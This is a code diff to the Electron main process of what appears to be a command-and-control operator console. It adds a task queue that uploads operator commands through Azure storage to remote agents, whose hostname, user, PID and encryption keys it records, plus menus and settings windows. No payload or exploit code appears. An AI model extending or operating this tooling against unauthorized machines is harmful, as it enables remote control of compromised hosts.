@@ -1,10 +1,12 @@
-const { app, BrowserWindow, ipcMain, Menu, clipboard, shell, screen, dialog, MenuItem } = require('electron');
+const { app, BrowserWindow, ipcMain, Menu, clipboard, shell, screen, dialog, MenuItem, nativeTheme } = require('electron');
 const fs   = require('fs');  
+const path = require('path');
 const az   = require('./azure');
 const { getAppDataDir } = require('./common');
 const directories = getAppDataDir();
 global.config = require(directories.configFilePath);
-const agents = [];
+const agents        = [];
+global.removedAgents = [];
 let win;
 global.agentids           = [];
 global.agentwindows       = 0;
@@ -12,6 +14,10 @@ global.agentWindowHandles = {}; // Store windows by agentID
 global.dashboardWindow    = null;
 global.agents             = [];
 global.haltUpdate         = false;
+
+// Task queue system
+global.taskQueue = [];
+global.isProcessingTask = false;
 
 class Container 
 {
@@ -47,10 +53,14 @@ class Task {
         this.outputChannel = 'o-' + Math.random().toString(36).substring(2, 14);
         this.command = command;
         this.taskid = Math.random().toString(36).substring(2, 14);
+        this.status = 'starting';
     }
 }
 
 function createDashboardWindow() {
+    // Force dark theme
+    nativeTheme.themeSource = 'dark';
+    
     const primaryDisplay = screen.getPrimaryDisplay();
     const { width, height } = primaryDisplay.workAreaSize;
     
@@ -58,14 +68,25 @@ function createDashboardWindow() {
         width: Math.floor(width * 0.76),
         height: Math.floor(height * 0.8),
         center: true,
+        darkTheme: true,
         webPreferences: {
           contextIsolation: false,
           enableRemoteModule: true,
           nodeIntegration: true
         },
     });
+    
+    // Set dashboard-specific menu when window is focused
+    global.dashboardWindow.on('focus', () => {
+        setDashboardMenu();
+    });
+    
     global.dashboardWindow.focus();
     global.dashboardWindow.loadFile('dashboard.html');
+    
+    // Set dashboard menu immediately
+    setDashboardMenu();
+    
     console.log('Main window created');
 }
 
@@ -86,6 +107,7 @@ async function createContainerWindow(thisagentid) {
             width: Math.floor(width * 0.6),
             height: Math.floor(height * 0.7),
             center: true,
+            darkTheme: true,
             webPreferences: {
               contextIsolation: false,
               enableRemoteModule: true,
@@ -93,13 +115,43 @@ async function createContainerWindow(thisagentid) {
             },
         });
         let agent_object = global.agents.find(agent => agent.agentid === thisagentid);
+        
+        if (!agent_object) {
+            console.error(`createContainerWindow: No agent found with ID ${thisagentid}`);
+            console.log('Available agents:', global.agents.map(a => a.agentid));
+            return;
+        }
+        
+        console.log(`createContainerWindow: Found agent:`, agent_object.agentid, agent_object.hostname);
         global.agentWindowHandles[agent_object.agentid] = containerWin;
         global.agentwindows++;
         containerWin.loadFile('agent.html').then(() => {
+            console.log(`createContainerWindow: Sending container-data for agent ${agent_object.agentid}`);
             containerWin.webContents.send('container-data', agent_object);
+            
+            // Load and apply saved settings to new agent window
+            const customizePath = path.join(directories.configDir, 'customize.js');
+            try {
+                if (fs.existsSync(customizePath)) {
+                    delete require.cache[require.resolve(customizePath)];
+                    const savedSettings = require(customizePath);
+                    console.log('Applying saved settings to new agent window:', savedSettings);
+                    containerWin.webContents.send('apply-font-settings', savedSettings);
+                }
+            } catch (error) {
+                console.error('Error loading settings for new agent window:', error);
+            }
         });
         console.log(`Container window created for container: ${agent_object.container}`);
         console.log(`Number of agent windows : ${global.agentwindows}`);
+
+        // Store the agent ID in the window object for menu handling
+        containerWin.agentId = thisagentid;
+
+        // Set agent-specific menu when window is focused
+        containerWin.on('focus', () => {
+            setAgentMenu();
+        });
 
         containerWin.on('close', async (event) => {
             event.preventDefault(); 
@@ -143,6 +195,7 @@ async function createExplorerWindow(thisagent) {
         width: Math.floor(width * 0.6),
         height: Math.floor(height * 0.7),
         center: true,
+        darkTheme: true,
         webPreferences: {
             contextIsolation: false,
             enableRemoteModule: true,
@@ -169,10 +222,11 @@ function openAgentLogsExplorer() {
 function openConfigWindow() {
     const configWindow = new BrowserWindow({
         width: 500,
-        height: 400,
+        height: 500,
         title: "Configuration",
         parent: win,
         modal: true,
+        darkTheme: true,
         webPreferences: {
             contextIsolation: false,
             enableRemoteModule: true,
@@ -181,6 +235,619 @@ function openConfigWindow() {
     });
     configWindow.loadFile('settings.html');
 }
+
+let agentSettingsWindows = new Map(); // Track settings windows per agent
+let taskQueueWindows = new Map(); // Track task queue windows per agent
+let dashboardSettingsWindow = null; // Track dashboard settings window
+
+function setDashboardMenu() {
+    const dashboardMenu = Menu.buildFromTemplate([
+        {
+            label: 'View',
+            submenu: [
+                {
+                    label: 'Configuration',
+                    click: () => {
+                        openConfigWindow();
+                    }
+                },
+                {
+                    label: 'Downloads',
+                    click: () => {
+                        openDownloadsExplorer();
+                    }
+                },
+                {
+                    label: 'Agent Logs',
+                    click: () => {
+                        openAgentLogsExplorer();
+                    }
+                },
+                {
+                    type: 'separator'
+                },
+                {
+                    label: 'Dashboard Settings',
+                    click: () => {
+                        openDashboardSettingsWindow();
+                    }
+                }
+            ]
+        },
+        {
+            label: 'Developer',
+            submenu: [
+                {
+                    label: 'Toggle Developer Tools',
+                    accelerator: 'CmdOrCtrl+Shift+I',
+                    click: () => {
+                        const focusedWindow = BrowserWindow.getFocusedWindow();
+                        if (focusedWindow) {
+                            focusedWindow.webContents.toggleDevTools();
+                        }
+                    }
+                },
+                {
+                    label: 'Perform Command Test',
+                    click: () => {
+                        const focusedWindow = BrowserWindow.getFocusedWindow();
+                        if (focusedWindow) {
+                            focusedWindow.webContents.send('execute-test-command');
+                        }
+                    }
+                },
+                {
+                    role: 'reload'
+                }
+            ]
+        }
+    ]);
+    Menu.setApplicationMenu(dashboardMenu);
+}
+
+function setAgentMenu() {
+    const agentMenu = Menu.buildFromTemplate([
+        {
+            label: 'View',
+            submenu: [
+                {
+                    label: 'Configuration',
+                    click: () => {
+                        openConfigWindow();
+                    }
+                },
+                {
+                    label: 'Downloads',
+                    click: () => {
+                        openDownloadsExplorer();
+                    }
+                },
+                {
+                    label: 'Agent Logs',
+                    click: () => {
+                        openAgentLogsExplorer();
+                    }
+                },
+                {
+                    type: 'separator'
+                },
+                {
+                    label: 'Task Queue',
+                    click: () => {
+                        const focusedWindow = BrowserWindow.getFocusedWindow();
+                        if (focusedWindow && focusedWindow.agentId) {
+                            console.log(`[TASK QUEUE] Menu item clicked for agent: ${focusedWindow.agentId}`);
+                            openTaskQueueWindow(focusedWindow.agentId);
+                        }
+                    }
+                },
+                {
+                    type: 'separator'
+                },
+                {
+                    label: 'Agent Settings',
+                    click: () => {
+                        const focusedWindow = BrowserWindow.getFocusedWindow();
+                        if (focusedWindow) {
+                            console.log('Agent Settings clicked for agent window');
+                            openAgentSettingsWindow(focusedWindow);
+                        }
+                    }
+                }
+            ]
+        },
+        {
+            label: 'Developer',
+            submenu: [
+                {
+                    label: 'Toggle Developer Tools',
+                    accelerator: 'CmdOrCtrl+Shift+I',
+                    click: () => {
+                        const focusedWindow = BrowserWindow.getFocusedWindow();
+                        if (focusedWindow) {
+                            focusedWindow.webContents.toggleDevTools();
+                        }
+                    }
+                },
+                {
+                    label: 'Perform Command Test',
+                    click: () => {
+                        const focusedWindow = BrowserWindow.getFocusedWindow();
+                        if (focusedWindow) {
+                            focusedWindow.webContents.send('execute-test-command');
+                        }
+                    }
+                },
+                {
+                    role: 'reload'
+                }
+            ]
+        }
+    ]);
+    Menu.setApplicationMenu(agentMenu);
+}
+
+function openTaskQueueWindow(agentId) {
+    // Force dark mode for this window
+    nativeTheme.themeSource = 'dark';
+    console.log(`[TASK QUEUE] Opening task queue window for agent: ${agentId}`);
+    
+    // Check if task queue window already exists for this agent
+    if (taskQueueWindows.has(agentId)) {
+        const existingWindow = taskQueueWindows.get(agentId);
+        if (existingWindow && !existingWindow.isDestroyed()) {
+            console.log(`[TASK QUEUE] Focusing existing window for agent: ${agentId}`);
+            existingWindow.focus();
+            return;
+        }
+    }
+    
+    try {
+        const taskQueueWindow = new BrowserWindow({
+            width: 800,
+            height: 600,
+            title: `Task Queue - Agent ${agentId}`,
+            center: true,
+            resizable: true,
+            darkTheme: true,
+            webPreferences: {
+                contextIsolation: false,
+                enableRemoteModule: true,
+                nodeIntegration: true
+            },
+        });
+        
+        console.log(`[TASK QUEUE] Created window for agent: ${agentId}`);
+        
+        taskQueueWindow.loadFile('task-queue.html').then(() => {
+            console.log(`[TASK QUEUE] Loaded task-queue.html for agent: ${agentId}`);
+        }).catch((error) => {
+            console.error(`[TASK QUEUE] Error loading task-queue.html: ${error}`);
+        });
+        
+        // Store reference
+        taskQueueWindows.set(agentId, taskQueueWindow);
+        
+        // Clean up reference when window is closed
+        taskQueueWindow.on('closed', () => {
+            console.log(`[TASK QUEUE] Window closed for agent: ${agentId}`);
+            taskQueueWindows.delete(agentId);
+        });
+        
+        // Store agent ID for IPC communication
+        taskQueueWindow.agentId = agentId;
+        
+        // Send agent data when window loads
+        taskQueueWindow.webContents.on('did-finish-load', () => {
+            console.log(`[TASK QUEUE] Window finished loading for agent: ${agentId}`);
+            const agent = global.agents.find(agent => agent.agentid === agentId);
+            if (agent) {
+                console.log(`[TASK QUEUE] Sending agent data for: ${agentId}`);
+                taskQueueWindow.webContents.send('agent-data', agent);
+            } else {
+                console.log(`[TASK QUEUE] No agent found with ID: ${agentId}`);
+            }
+        });
+        
+    } catch (error) {
+        console.error(`[TASK QUEUE] Error creating window for agent ${agentId}: ${error}`);
+    }
+}
+
+function openAgentSettingsWindow(parentWindow) {
+    // Check if settings window already exists for this parent
+    if (agentSettingsWindows.has(parentWindow)) {
+        const existingWindow = agentSettingsWindows.get(parentWindow);
+        if (existingWindow && !existingWindow.isDestroyed()) {
+            existingWindow.focus();
+            return;
+        }
+    }
+    
+    const settingsWindow = new BrowserWindow({
+        width: 550,
+        height: 800,
+        title: "Agent Settings",
+        parent: parentWindow,
+        modal: false,
+        center: true,
+        resizable: true,
+        darkTheme: true,
+        webPreferences: {
+            contextIsolation: false,
+            enableRemoteModule: true,
+            nodeIntegration: true
+        },
+    });
+    
+    settingsWindow.loadFile('agent-settings.html');
+    
+    // Store reference
+    agentSettingsWindows.set(parentWindow, settingsWindow);
+    
+    // Clean up reference when window is closed
+    settingsWindow.on('closed', () => {
+        agentSettingsWindows.delete(parentWindow);
+    });
+    
+    // Store parent reference for IPC communication
+    settingsWindow.parentAgentWindow = parentWindow;
+}
+
+function openDashboardSettingsWindow() {
+    // Check if settings window already exists
+    if (dashboardSettingsWindow && !dashboardSettingsWindow.isDestroyed()) {
+        dashboardSettingsWindow.focus();
+        return;
+    }
+    
+    dashboardSettingsWindow = new BrowserWindow({
+        width: 550,
+        height: 360,
+        title: "Dashboard Settings",
+        parent: global.dashboardWindow,
+        modal: false,
+        center: true,
+        resizable: true,
+        darkTheme: true,
+        webPreferences: {
+            contextIsolation: false,
+            enableRemoteModule: true,
+            nodeIntegration: true
+        },
+    });
+    
+    dashboardSettingsWindow.loadFile('dashboard-settings.html');
+    
+    // Clean up reference when window is closed
+    dashboardSettingsWindow.on('closed', () => {
+        dashboardSettingsWindow = null;
+    });
+}
+
+// IPC handler for selecting background image
+ipcMain.handle('select-background-image', async () => {
+    const result = await dialog.showOpenDialog({
+        title: 'Select Background Image',
+        filters: [
+            { name: 'Images', extensions: ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg'] },
+            { name: 'All Files', extensions: ['*'] }
+        ],
+        properties: ['openFile']
+    });
+    
+    if (!result.canceled && result.filePaths.length > 0) {
+        return result.filePaths[0];
+    }
+    
+    return null;
+});
+
+// IPC handler for applying agent settings
+ipcMain.on('apply-agent-settings', (event, settings) => {
+    console.log('=== RECEIVED APPLY-AGENT-SETTINGS IPC ===');
+    console.log('Settings received:', settings);
+    
+    // Save settings to customize.js file
+    const customizePath = path.join(directories.configDir, 'customize.js');
+    console.log('Saving to customize path:', customizePath);
+    
+    // Load existing settings to preserve backgroundImage
+    let existingSettings = {};
+    try {
+        if (fs.existsSync(customizePath)) {
+            delete require.cache[require.resolve(customizePath)];
+            existingSettings = require(customizePath);
+        }
+    } catch (error) {
+        console.error('Error loading existing settings for merge:', error);
+    }
+    
+    const customizeConfig = {
+        fontFamily: settings.fontFamily,
+        fontSize: settings.fontSize,
+        fontColor: settings.fontColor,
+        zoom: settings.zoom,
+        backgroundImage: existingSettings.backgroundImage || null, // Preserve existing dashboard background image
+        agentBackgroundImage: settings.agentBackgroundImage,
+        historyLength: settings.historyLength !== undefined ? settings.historyLength : 100,
+        lastUpdated: new Date().toISOString(),
+        version: "1.0.0"
+    };
+    
+    try {
+        fs.writeFileSync(customizePath, `module.exports = ${JSON.stringify(customizeConfig, null, 4)};`);
+        console.log('Customize settings saved successfully');
+    } catch (error) {
+        console.error('Error saving customize settings:', error);
+    }
+    
+    // Find the settings window that sent this message
+    const settingsWindow = BrowserWindow.fromWebContents(event.sender);
+    console.log('Settings window found:', !!settingsWindow);
+    
+    const parentWindow = settingsWindow ? settingsWindow.parentAgentWindow : null;
+    console.log('Parent window found:', !!parentWindow);
+    console.log('Parent window destroyed?', parentWindow ? parentWindow.isDestroyed() : 'N/A');
+    
+    if (parentWindow && !parentWindow.isDestroyed()) {
+        console.log('Sending apply-font-settings to parent window...');
+        // Send settings to the parent agent window
+        parentWindow.webContents.send('apply-font-settings', settings);
+        console.log('apply-font-settings IPC sent to parent');
+    } else {
+        console.error('Parent window not available or destroyed');
+        
+        // Fallback: try to apply to all agent windows
+        console.log('Fallback: applying to all agent windows');
+        Object.values(global.agentWindowHandles || {}).forEach((window, index) => {
+            if (window && !window.isDestroyed()) {
+                console.log(`Sending to agent window ${index}`);
+                window.webContents.send('apply-font-settings', settings);
+            }
+        });
+    }
+
+    // Also send settings to dashboard window for background image
+    if (global.dashboardWindow && !global.dashboardWindow.isDestroyed()) {
+        console.log('Sending apply-font-settings to dashboard window...');
+        global.dashboardWindow.webContents.send('apply-font-settings', settings);
+        console.log('apply-font-settings IPC sent to dashboard');
+    }
+});
+
+// IPC handler for reading customize settings
+ipcMain.handle('get-customize-settings', () => {
+    const customizePath = path.join(directories.configDir, 'customize.js');
+    console.log('Looking for customize.js at:', customizePath);
+    
+    try {
+        // Check if customize.js exists, if not create it with defaults
+        if (!fs.existsSync(customizePath)) {
+            console.log('Creating new customize.js file...');
+            const defaultConfig = {
+                fontFamily: "'Fira Code', monospace",
+                fontSize: 16,
+                fontColor: "#c5c5c5",
+                zoom: 1.0,
+                backgroundImage: null,
+                agentBackgroundImage: null,
+                historyLength: 100,
+                lastUpdated: new Date().toISOString(),
+                version: "1.0.0"
+            };
+            fs.writeFileSync(customizePath, `module.exports = ${JSON.stringify(defaultConfig, null, 4)};`);
+            console.log('Created default customize.js file at:', customizePath);
+        }
+        
+        // Clear require cache to get fresh data
+        delete require.cache[require.resolve(customizePath)];
+        const customizeConfig = require(customizePath);
+        console.log('Loaded customize settings:', customizeConfig);
+        return customizeConfig;
+    } catch (error) {
+        console.error('Error loading customize settings:', error);
+        // Return defaults if file can't be read
+        return {
+            fontFamily: "'Fira Code', monospace",
+            fontSize: 16,
+            fontColor: "#c5c5c5",
+            zoom: 1.0,
+            backgroundImage: null,
+            agentBackgroundImage: null,
+            historyLength: 100
+        };
+    }
+});
+
+// IPC handler for closing agent settings window
+ipcMain.on('close-agent-settings-window', (event) => {
+    const settingsWindow = BrowserWindow.fromWebContents(event.sender);
+    if (settingsWindow && !settingsWindow.isDestroyed()) {
+        settingsWindow.close();
+    }
+});
+
+// IPC handler for reloading agent history with new length setting
+ipcMain.on('reload-agent-history', (event, historyLength) => {
+    console.log('=== RECEIVED RELOAD-AGENT-HISTORY IPC ===');
+    console.log('History length:', historyLength);
+    
+    // Find the settings window that sent this message
+    const settingsWindow = BrowserWindow.fromWebContents(event.sender);
+    const parentWindow = settingsWindow ? settingsWindow.parentAgentWindow : null;
+    
+    if (parentWindow && !parentWindow.isDestroyed()) {
+        console.log('Sending reload-history to parent agent window...');
+        parentWindow.webContents.send('reload-history', historyLength);
+        console.log('reload-history IPC sent to parent');
+    } else {
+        console.error('Parent window not available for history reload');
+    }
+});
+
+// IPC handler for applying dashboard settings
+ipcMain.on('apply-dashboard-settings', (event, settings) => {
+    console.log('=== RECEIVED APPLY-DASHBOARD-SETTINGS IPC ===');
+    console.log('Dashboard settings received:', settings);
+    
+    // Load existing settings and merge with dashboard-specific settings
+    const customizePath = path.join(directories.configDir, 'customize.js');
+    let existingSettings = {};
+    
+    try {
+        if (fs.existsSync(customizePath)) {
+            delete require.cache[require.resolve(customizePath)];
+            existingSettings = require(customizePath);
+        }
+    } catch (error) {
+        console.error('Error loading existing settings:', error);
+    }
+    
+    // Merge dashboard settings with existing settings
+    const customizeConfig = {
+        ...existingSettings,
+        backgroundImage: settings.backgroundImage,
+        lastUpdated: new Date().toISOString(),
+        version: "1.0.0"
+    };
+    
+    try {
+        fs.writeFileSync(customizePath, `module.exports = ${JSON.stringify(customizeConfig, null, 4)};`);
+        console.log('Dashboard settings saved successfully');
+    } catch (error) {
+        console.error('Error saving dashboard settings:', error);
+    }
+    
+    // Apply background image to dashboard window immediately
+    if (global.dashboardWindow && !global.dashboardWindow.isDestroyed()) {
+        console.log('Sending apply-font-settings to dashboard window...');
+        global.dashboardWindow.webContents.send('apply-font-settings', customizeConfig);
+        console.log('apply-font-settings IPC sent to dashboard');
+    }
+});
+
+// IPC handler for closing dashboard settings window
+ipcMain.on('close-dashboard-settings-window', (event) => {
+    const settingsWindow = BrowserWindow.fromWebContents(event.sender);
+    if (settingsWindow && !settingsWindow.isDestroyed()) {
+        settingsWindow.close();
+    }
+});
+
+// IPC handlers for task queue operations
+ipcMain.handle('get-agent-tasks', (event, agentId) => {
+    const agent = global.agents.find(agent => agent.agentid === agentId);
+    return agent ? agent.tasks || [] : [];
+});
+
+ipcMain.handle('remove-task', (event, agentId, taskId) => {
+    try {
+        const agent = global.agents.find(agent => agent.agentid === agentId);
+        if (agent && agent.tasks) {
+            const taskIndex = agent.tasks.findIndex(task => task.taskid === taskId);
+            if (taskIndex !== -1) {
+                // Don't remove tasks that are currently processing
+                if (agent.tasks[taskIndex].status === 'processing') {
+                    return { success: false, message: 'Cannot remove task that is currently processing' };
+                }
+                agent.tasks.splice(taskIndex, 1);
+                console.log(`[TASK QUEUE] Removed task ${taskId} from agent ${agentId}`);
+                
+                // Notify all task queue windows for this agent
+                if (taskQueueWindows.has(agentId)) {
+                    const window = taskQueueWindows.get(agentId);
+                    if (window && !window.isDestroyed()) {
+                        window.webContents.send('task-removed', taskId);
+                    }
+                }
+                
+                return { success: true };
+            }
+        }
+        return { success: false, message: 'Task not found' };
+    } catch (error) {
+        console.error('Error removing task:', error);
+        return { success: false, message: error.message };
+    }
+});
+
+ipcMain.handle('modify-task', (event, agentId, taskId, newCommand) => {
+    try {
+        const agent = global.agents.find(agent => agent.agentid === agentId);
+        if (agent && agent.tasks) {
+            const task = agent.tasks.find(task => task.taskid === taskId);
+            if (task) {
+                // Don't modify tasks that are currently processing
+                if (task.status === 'processing') {
+                    return { success: false, message: 'Cannot modify task that is currently processing' };
+                }
+                task.command = newCommand;
+                console.log(`[TASK QUEUE] Modified task ${taskId} for agent ${agentId}: ${newCommand}`);
+                
+                // Notify all task queue windows for this agent
+                if (taskQueueWindows.has(agentId)) {
+                    const window = taskQueueWindows.get(agentId);
+                    if (window && !window.isDestroyed()) {
+                        window.webContents.send('task-modified', task);
+                    }
+                }
+                
+                return { success: true };
+            }
+        }
+        return { success: false, message: 'Task not found' };
+    } catch (error) {
+        console.error('Error modifying task:', error);
+        return { success: false, message: error.message };
+    }
+});
+
+ipcMain.handle('reorder-task', (event, agentId, taskId, direction) => {
+    try {
+        const agent = global.agents.find(agent => agent.agentid === agentId);
+        if (agent && agent.tasks) {
+            const taskIndex = agent.tasks.findIndex(task => task.taskid === taskId);
+            if (taskIndex !== -1) {
+                const task = agent.tasks[taskIndex];
+                
+                // Don't move tasks that are processing
+                if (task.status === 'processing') {
+                    return { success: false, message: 'Cannot reorder task that is currently processing' };
+                }
+                
+                let newIndex = taskIndex;
+                if (direction === 'up' && taskIndex > 0) {
+                    newIndex = taskIndex - 1;
+                } else if (direction === 'down' && taskIndex < agent.tasks.length - 1) {
+                    newIndex = taskIndex + 1;
+                } else {
+                    return { success: false, message: 'Cannot move task in that direction' };
+                }
+                
+                // Remove task from current position and insert at new position
+                agent.tasks.splice(taskIndex, 1);
+                agent.tasks.splice(newIndex, 0, task);
+                
+                console.log(`[TASK QUEUE] Moved task ${taskId} ${direction} for agent ${agentId}`);
+                
+                // Notify all task queue windows for this agent
+                if (taskQueueWindows.has(agentId)) {
+                    const window = taskQueueWindows.get(agentId);
+                    if (window && !window.isDestroyed()) {
+                        window.webContents.send('tasks-reordered', agent.tasks);
+                    }
+                }
+                
+                return { success: true };
+            }
+        }
+        return { success: false, message: 'Task not found' };
+    } catch (error) {
+        console.error('Error reordering task:', error);
+        return { success: false, message: error.message };
+    }
+});
 
 ipcMain.handle('updateagent', async (event, agentid,newcontainerid) => {
     try
@@ -215,25 +882,24 @@ ipcMain.on('upload-client-command-to-input-channel', async (event, agent_object)
         console.log(`kernel.js :  IPC "upload-client-command-to-input-channel`);
         let global_agent_object = global.agents.find(agent => agent.agentid === agent_object.agentid);
         let agent_task          = agent_object.tasks[agent_object.tasks.length - 1];
+        
+        // Set task status to queued and add to the global agent's task list
+        agent_task.status = 'queued';
+        
+        // Initialize tasks array if it doesn't exist
+        if (!global_agent_object.tasks) {
+            global_agent_object.tasks = [];
+        }
+        
         global_agent_object.tasks.push(agent_task);
-
-        let commandOutput = false;
-        while (commandOutput === false) {
-            commandOutput = await az.uploadCommand(agent_object);
-            if (commandOutput === false) {
-                await new Promise(resolve => setTimeout(resolve, 3000));
-            }
-        }
-        console.log(`[KERNEL][IPC] command-output : ${commandOutput}`);
-        let command_response = {
-            'command' : agent_task.command,
-            'taskid'  : agent_task.taskid,
-            'output'  : commandOutput
-        }
-        event.reply('command-output', command_response);
+        
+        console.log(`[TASK QUEUE] Task ${agent_task.taskid} added to queue for agent ${agent_object.agentid}`);
+        
+        // The task will be processed by the task queue processor
+        // No immediate response is sent - the queue processor will send the response when complete
     } catch (error) {
-        console.error('Error uploading command to Azure Blob Storage:', error);
-        event.reply('command-output', `Error: ${error.message}`); // Send error response
+        console.error('Error adding task to queue:', error);
+        event.reply('command-output', `Error: ${error.message}`);
     }
 });
 
@@ -293,9 +959,19 @@ ipcMain.handle('preload-agents', async () => {
 });
 
 ipcMain.handle('get-containers', async () => {
+    // console.log(`[KENEL][IPC] get-containers : ${global.removedAgents}`);
+    // console.log(`[KENEL][IPC] global.haltUpdate : ${global.haltUpdate}`);
     if (global.haltUpdate == false)
     {
         let blobs = await az.updateDashboardTable();
+        if (global.removedAgents.length > 0)
+        {
+            for (let i = 0; i < global.removedAgents.length; i++)
+            {
+                blobs.removedAgents = global.removedAgents[i];
+                console.log(`[KENEL][IPC] global.removedAgents[${i}] : ${global.removedAgents[i]}`);
+            }
+        }
         return blobs;
     }
     else
@@ -352,59 +1028,12 @@ ipcMain.on('execute-command', (event, command) => {
 app.whenReady().then(() => {
     console.log('App is ready');
     createDashboardWindow();
-    const menu = Menu.buildFromTemplate([
-      {
-          label: 'View',
-          submenu: [
-              {
-                  label: 'Configuration',
-                  click: () => {
-                      openConfigWindow();
-                  }
-              },
-              {
-                  label: 'Downloads',
-                  click: () => {
-                      openDownloadsExplorer();
-                  }
-              },
-              {
-                  label: 'Agent Logs',
-                  click: () => {
-                      openAgentLogsExplorer();
-                  }
-              }
-          ]
-      },
-      {
-          label: 'Developer',
-          submenu: [
-              {
-                  label: 'Toggle Developer Tools',
-                  accelerator: 'CmdOrCtrl+Shift+I',
-                  click: () => {
-                      const focusedWindow = BrowserWindow.getFocusedWindow();
-                      if (focusedWindow) {
-                          focusedWindow.webContents.toggleDevTools();
-                      }
-                  }
-              },
-              {
-                  label: 'Perform Command Test',
-                  click: () => {
-                      const focusedWindow = BrowserWindow.getFocusedWindow();
-                      if (focusedWindow) {
-                          focusedWindow.webContents.send('execute-test-command');
-                      }
-                  }
-              },
-              {
-                  role: 'reload'
-              }
-          ]
-      }
-  ]);
-Menu.setApplicationMenu(menu);
+    
+    // Start the task queue processor
+    startTaskQueue();
+    
+    // Set initial dashboard menu
+    setDashboardMenu();
 // Handle right-click context menu for table rows
 ipcMain.on('show-row-context-menu', (event, agentsDataJSON) => {
         let agentsData = JSON.parse(agentsDataJSON);
@@ -416,7 +1045,7 @@ ipcMain.on('show-row-context-menu', (event, agentsDataJSON) => {
                 click: async () => {
                     try {
                         global.haltUpdate = true;
-
+                        global.removedAgents.push(agentid);
                         // Handle agent window cleanup
                         if (global.agentWindowHandles[agentid]) {
                             try {
@@ -596,3 +1225,127 @@ app.on('activate', () => {
         createDashboardWindow();
     }
 });
+
+// Task Queue Processor - runs every 0.5 seconds
+function processTaskQueue() {
+    // Skip if already processing a task
+    if (global.isProcessingTask) {
+        return;
+    }
+
+    // Find the next queued task across all agents
+    let nextTask = null;
+    let taskAgent = null;
+
+    for (let agent of global.agents) {
+        if (agent.tasks && agent.tasks.length > 0) {
+            const queuedTask = agent.tasks.find(task => task.status === 'queued');
+            if (queuedTask) {
+                nextTask = queuedTask;
+                taskAgent = agent;
+                break; // Process tasks in agent order
+            }
+        }
+    }
+
+    if (!nextTask || !taskAgent) {
+        return; // No queued tasks found
+    }
+
+    // Mark as processing
+    global.isProcessingTask = true;
+    nextTask.status = 'processing';
+
+    console.log(`[TASK QUEUE] Processing task ${nextTask.taskid} for agent ${taskAgent.agentid}`);
+
+    // Process the task
+    processTask(taskAgent, nextTask)
+        .then((commandOutput) => {
+            console.log(`[TASK QUEUE] Task ${nextTask.taskid} completed with output:`, commandOutput);
+            // Detect error in output
+            if (typeof commandOutput === 'string' && commandOutput.trim().toLowerCase().startsWith('error')) {
+                nextTask.status = 'error';
+            } else {
+                nextTask.status = 'completed';
+            }
+            nextTask.output = commandOutput; // Save output to the task object
+            // Send result back to the agent window
+            const command_response = {
+                'command': nextTask.command,
+                'taskid': nextTask.taskid,
+                'output': commandOutput,
+                'status': nextTask.status
+            };
+            const agentWindow = global.agentWindowHandles[taskAgent.agentid];
+            if (agentWindow && !agentWindow.isDestroyed()) {
+                agentWindow.webContents.send('command-output', command_response);
+            }
+        })
+        .catch((error) => {
+            console.error(`[TASK QUEUE] Error processing task ${nextTask.taskid}:`, error);
+            nextTask.status = 'error';
+            nextTask.output = `Error: ${error.message}`; // Save error to the task object
+            const command_response = {
+                'command': nextTask.command,
+                'taskid': nextTask.taskid,
+                'output': `Error: ${error.message}`,
+                'status': nextTask.status
+            };
+
+            const agentWindow = global.agentWindowHandles[taskAgent.agentid];
+            if (agentWindow && !agentWindow.isDestroyed()) {
+                agentWindow.webContents.send('command-output', command_response);
+            }
+        })
+        .finally(() => {
+            // Mark as no longer processing
+            global.isProcessingTask = false;
+            console.log(`[TASK QUEUE] Finished processing task ${nextTask.taskid}`);
+        });
+}
+
+// Process individual task
+async function processTask(agent, task) {
+    try {
+        // Ensure the command is included in the agent_object.tasks array as a string (legacy) or as an object with a command property
+        const agent_object = {
+            agentid: agent.agentid,
+            tasks: [typeof task === 'string' ? { command: task } : task], // Always pass as object with command property
+            // Include other necessary agent properties
+            container: agent.container,
+            key: agent.aes ? agent.aes.key : agent.key,
+            iv: agent.aes ? agent.aes.iv : agent.iv,
+            aes: agent.aes,
+            blobs: agent.blobs,
+            arch: agent.arch,
+            hostname: agent.hostname,
+            IP: agent.IP,
+            osRelease: agent.osRelease,
+            osType: agent.osType,
+            PID: agent.PID,
+            platform: agent.platform,
+            Process: agent.Process,
+            username: agent.username,
+            checkin: agent.checkin,
+            links: agent.links,
+            mode: agent.mode
+        };
+
+        let commandOutput = false;
+        while (commandOutput === false) {
+            commandOutput = await az.uploadCommand(agent_object);
+            if (commandOutput === false) {
+                await new Promise(resolve => setTimeout(resolve, 3000));
+            }
+        }
+        return commandOutput;
+    } catch (error) {
+        throw error;
+    }
+}
+
+// Start task queue processor
+function startTaskQueue() {
+    console.log('[TASK QUEUE] Starting task queue processor...');
+    setInterval(processTaskQueue, 500); // Run every 0.5 seconds
+}
